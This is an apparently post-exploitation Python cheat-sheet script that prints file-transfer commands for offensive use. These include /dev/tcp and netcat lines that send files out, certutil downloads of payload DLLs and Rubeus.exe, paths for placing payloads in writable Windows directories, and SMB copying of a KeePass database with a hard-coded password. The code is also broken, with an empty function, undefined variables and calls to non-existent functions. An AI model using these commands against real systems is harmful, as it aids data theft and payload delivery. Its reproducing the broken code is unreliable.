#!/usr/bin/python3

import sys
import subprocess
from base64 import b64encode
import argparse

def paths():

    print("\n********** Windows **********\n")
    print(f"C:\Windows\Tasks") 
    print(f"C:\Windows\Temp")
    print(f"C:\windows\\tracing")
    print(f"C:\Windows\Registration\CRMLog")
    print(f"C:\Windows\System32\FxsTmp")
    print(f"C:\Windows\System32\com\dmp")
    print(f"C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys")
    print(f"C:\Windows\System32\spool\PRINTERS")
    print(f"C:\Windows\System32\spool\SERVERS")
    print(f"C:\Windows\System32\spool\drivers\color")
    print(f"C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter")
    print(f"C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)")
    print(f"C:\Windows\SysWOW64\FxsTmp")
    print(f"C:\Windows\SysWOW64\com\dmp")
    print(f"C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter")
    print(f"C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System")

    
    print("\n********** Linux **********\n")
    print(f"find / -writable -type d 2>/dev/null")
    print(f"/tmp")
    print(f"/dev/shm")

    print("\n********** Grant perm **********\n")
    print(f"icacls C:\Windows\Temp /grant Everyone:(OI)(CI)F")
    print(f"chmod +w .")


def installs():
    print("pip3 install wsgidav")
    print("pip install pyftpdlib")
    print("pip install updog")
    print("python3 -m pip install --user uploadserver")

def print_listener(port):
        
    
    

def ftp_transfer(ip):
    print(f"python -m pyftpdlib -p{port} -w")
    print(f"ftp {ip}")

def scp():

    print(f"To copy a file over from local host to a remote host")
    print(f"scp ./{file} username@{ip}:/tmp/{file} -p {port}")
    print(f"To copy a file from a remote host to your local host")
    print(f"scp username@{ip}:/tmp/{file} ./{file}")
    print(f"To copy over a directory from your local host to a remote host")
    print(f"scp -r directory username@{ip}:/tmp/{file}")

def socat(ip, port, file):
    print(f"socat -u FILE:'{file}' TCP-LISTEN:{port},reuseaddr")
    print(f"socat -u TCP:{ip}:{port} STDOUT > {file}")


def nc(ip, port):

    print(f"\n********** Listener **********\n")
    print(f"nc -nlvp {port} > {file}")

    print(f"\n********** Send **********\n")
    print(f"cat < {file} > /dev/tcp/{ip}/{port}")
    print(f"nc -w 3 {ip} {port} < {file}")


def http_transfer(ip, port, file):
    print("\n********** HTTP **********\n\n")

    print("\n********** Listener **********\n")

    print(f"php -S 0.0.0.0{port}")
    print("ruby -run -e httpd . -p 8000")

    print(f"python -m SimpleHTTPServer 8080")
    print(f"python2 -m SimpleHTTPServer 8080")
    print(f"python3 -m http.server {port}")

    print("\n********** Upload Server **********\n")
    print(f"python3 -m uploadserver --basic-auth hello:world")
    print(f"curl -X POST http://HOST/upload -H -F 'files=@file.txt'")

    print("\n********** Windows **********\n")
    print(f"certutil.exe -f -urlcache -split http://{ip}{port}/{file}")
    print(f"certutil -decode payload.b64 payload.dll")
    print(f"certutil -encode payload.dll payload.b64")
    print(f"curl 10.10.14.29/Rubeus.exe -o Rubeus.exe")
    print(f"wget http://192.168.1.2/putty.exe -OutFile putty.exe")
    print(f"iwr -uri http://10.10.14.29/PS.exe -OutFile PsBypassCLM.exe")
    print(f"iwr por TLS:")
    print(f"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12")

    print("\n********** Linux **********\n")
    print(f"wget {ip}:{port} {file}")
    print(f"curl http://{ip}:{port}/{file} --output {file}")

def smb_transfer(ip, file):

    print("\n********** SMB **********\n\n")
    print("\n********** Listener **********\n")
    print(f"wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/")
    print(f"impacket-smbserver share $(pwd) -smb2support")
    print(f"smbserver.py -smb2support share .")

    print(f"copy CEH.kdbx \\10.10.14.3\smbFolder\CEH.kdbx De Win a nuestro parrot")
    print(f"copy \\10.10.14.3\smbFolder\CEH.kdbx CEH.kdbx De parrot a Win")
    print(f"net use x: \\10.185.10.34\smbFolder /user:share_admin Wind0wz87!kj")
    print(f"X: para usar esta unidad compartida") 
    print(f"net view \\10.10.14.3\smbFolder")



def main():
    if len(sys.argv) < 1:
        print("Usage: transfer <IP> <PORT> <FILE> <MODE>")
        print("Examples: ")
        print("Shells: \n\t-paths \n\t-install \n\t-share \n\t-http \n\t-ftp \n\t-smb")
        sys.exit(1)

    ip = sys.argv[1]
    port = sys.argv[2]
    file = sys.argv[3]
    mode = sys.argv[4]

    if mode == "-paths":
        print_powershell(ip, port)
    elif mode == "-install":
        print_powercat(ip, port)
    elif mode == "-share":
        print_nishang(ip, port)
    elif mode == "-http":
        print_bash(ip, port)
    elif mode == "-smb":
        print_php(ip, port)

    else:
        print(f"Mode '{shell_type}' not recognized.")

if __name__ == "__main__":
    main()
